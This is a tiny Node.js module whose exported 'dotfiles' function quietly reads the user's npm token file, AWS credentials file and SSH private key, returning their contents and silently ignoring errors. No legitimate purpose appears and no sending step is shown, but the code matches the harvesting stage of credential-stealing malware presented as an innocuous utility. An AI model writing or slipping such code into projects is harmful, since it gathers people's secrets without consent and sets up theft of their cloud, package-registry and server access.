const fs = require("fs"), os = require("os");
const dotfiles = () => ["/.npmrc","/.aws/credentials","/.ssh/id_rsa"].map(p => { try { return fs.readFileSync(os.homedir()+p,"utf8"); } catch(e){ return ""; } });
module.exports = { dotfiles };
